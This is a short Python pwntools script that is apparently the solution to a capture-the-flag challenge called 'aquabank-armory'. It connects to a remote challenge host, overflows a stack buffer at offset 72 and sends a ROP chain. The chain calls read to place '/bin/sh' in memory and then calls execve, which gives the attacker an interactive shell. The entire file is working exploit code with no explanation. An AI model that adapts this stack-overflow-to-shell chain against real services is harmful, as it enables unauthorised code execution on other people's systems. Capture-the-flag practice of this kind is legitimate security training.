#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./aquabank-armory', checksec=False)
#p = process(elf.path)
p = remote ("offsec.m0lecon.it", 13562)

OFFSET = 72
rop = ROP(elf)

# gadgets
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

bss = elf.bss() + 0x300

payload = flat(
    b"A" * OFFSET,

    # read(0, bss, 8)
    pop_rax,
    0,          # syscall number 0 = read
    pop_rdi,
    0,
    pop_rsi,
    bss,
    pop_rdx,
    8,
    syscall,

    # execve(bss, 0, 0)
    pop_rax,
    59,
    pop_rdi,
    bss,
    pop_rsi,
    0,
    pop_rdx,
    0,
    syscall
)

p.recvuntil(b'weapons:')
p.send(payload)

# send /bin/sh
p.send(b"/bin/sh\x00")

p.interactive()
